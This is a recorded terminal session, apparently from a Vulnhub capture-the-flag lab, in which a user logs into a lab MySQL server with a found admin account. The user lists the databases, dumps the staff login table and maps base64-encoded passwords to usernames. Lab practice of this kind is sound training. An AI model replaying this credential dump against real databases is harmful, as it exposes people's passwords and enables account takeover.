@@ -1,0 +1,82 @@
+Script started on 2024-01-02 21:10:28+02:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="86" LINES="35"]
+]0;export NVM_DIR="$HOME/.nvm" - Parrot Terminal]0;[ -s "$NVM_DIR/nvm.sh" ] - Parrot Terminal]0;\. "$NVM_DIR/nvm.sh" - Parrot Terminal]0;[ -s "$NVM_DIR/bash_completion" ] - Parrot Terminal]0;\. "$NVM_DIR/bash_completion" - Parrot Terminal]0;[ -x /usr/bin/dircolors ] - Parrot Terminal]0;test -r ~/.dircolors - Parrot Terminal]0;eval "$(dircolors -b)" - Parrot Terminal]0;LS_COLORS='rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:' - Parrot Terminal]0;export LS_COLORS - Parrot Terminal]0;alias ls='ls --color=auto -v' - Parrot Terminal]0;alias dir='dir --color=auto' - Parrot Terminal]0;alias vdir='vdir --color=auto' - Parrot Terminal]0;alias grep='grep --color=auto' - Parrot Terminal]0;alias fgrep='fgrep --color=auto' - Parrot Terminal]0;alias egrep='egrep --color=auto' - Parrot Terminal]0;alias ll='ls -lh ' - Parrot Terminal]0;alias la='ls -lha' - Parrot Terminal]0;alias l='ls -CF' - Parrot Terminal]0;alias em='emacs -nw' - Parrot Terminal]0;alias _='sudo' - Parrot Terminal]0;alias _i='sudo -i' - Parrot Terminal]0;export OBSIDIANVAULT=/home/figaro/Documents/Obsidian\ Vault/ - Parrot Terminal]0;[ -f ~/.bash_aliases ] - Parrot Terminal]0;. ~/.bash_aliases - Parrot Terminal]0;[ -f ~/.bash_profile ] - Parrot Terminal]0;. ~/.bash_profile - Parrot Terminal]0;export GPROJ=/home/figaro/Programms/Github_Projects/NikolasProjects - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;shopt -oq posix - Parrot Terminal]0;[ -f /usr/share/bash-completion/bash_completion ] - Parrot Terminal]0;. /usr/share/bash-completion/bash_completion - Parrot Terminal[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m[7mmysql -u qdpmadmin -h 192.168.1.9 -p[27m[C[C[C[C[C[Cmysql -u qdpmadmin -h 192.168.1.9 -p
+[?2004l]0;mysql -u qdpmadmin -h 192.168.1.9 -p - Parrot TerminalEnter password: 
+(B[0;1mWelcome to the MariaDB monitor.  Commands end with ; or \g.
+(B[m(B[0;1mYour MySQL connection id is 185
+Server version: 8.0.26 MySQL Community Server - GPL
+
+(B[m(B[0;1mCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+(B[m(B[0;1mType 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+(B[mMySQL [(none)]> show[20G[Kw databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| qdpm               |
+| staff              |
+| sys                |
++--------------------+
+(B[0;1m6 rows in set (0,006 sec)
+(B[m(B[0;1m
+(B[mMySQL [(none)]> use staff;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+(B[0;1mDatabase changed
+(B[mMySQL [staff]> show tables;
++-----------------+
+| Tables_in_staff |
++-----------------+
+| department      |
+| login           |
+| user            |
++-----------------+
+(B[0;1m3 rows in set (0,006 sec)
+(B[m(B[0;1m
+(B[mMySQL [staff]> select * from user;
++------+---------------+--------+---------------------------+
+| id   | department_id | name   | role                      |
++------+---------------+--------+---------------------------+
+|    1 |             1 | Smith  | Cyber Security Specialist |
+|    2 |             2 | Lucas  | Computer Engineer         |
+|    3 |             1 | Travis | Intelligence Specialist   |
+|    4 |             1 | Dexter | Cyber Security Analyst    |
+|    5 |             2 | Meyer  | Genetic Engineer          |
++------+---------------+--------+---------------------------+
+(B[0;1m5 rows in set (0,090 sec)
+(B[m(B[0;1m
+(B[mMySQL [staff]> select * from login;
++------+---------+--------------------------+
+| id   | user_id | password                 |
++------+---------+--------------------------+
+|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
+|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
+|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
+|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
+|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
++------+---------+--------------------------+
+(B[0;1m5 rows in set (0,022 sec)
+(B[m(B[0;1m
+(B[mMySQL [staff]> select name,[27G[K[26G[K[25G[K[24G[K[23G[Kname,password from login join user on user.id=login.id[76G[K[75G[K[74G[K[73G[K[72G[K[71G[K[70G[K[69G[K[68G[K[67G[K[66G[K[65G[K_os[67G[K[66G[Kid-[68G[K=id[69Guid[70Gsid[71Geid[72Grid[73G.idid;
++--------+--------------------------+
+| name   | password                 |
++--------+--------------------------+
+| Smith  | WDdNUWtQM1cyOWZld0hkQw== |
+| Lucas  | c3VSSkFkR3dMcDhkeTNyRg== |
+| Travis | REpjZVZ5OThXMjhZN3dMZw== |
+| Dexter | N1p3VjRxdGc0MmNtVVhHWA== |
+| Meyer  | Y3FObkJXQ0J5UzJEdUpTeQ== |
++--------+--------------------------+
+(B[0;1m5 rows in set (0,008 sec)
+(B[m(B[0;1m
+(B[mMySQL [staff]> ex[17G[K[16G[K^D(B[0;1mBye
+(B[m[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexot[K[Kit
+[?2004l]0;exit - Parrot Terminalexit
+
+Script done on 2024-01-02 21:14:10+02:00 [COMMAND_EXIT_CODE="0"]
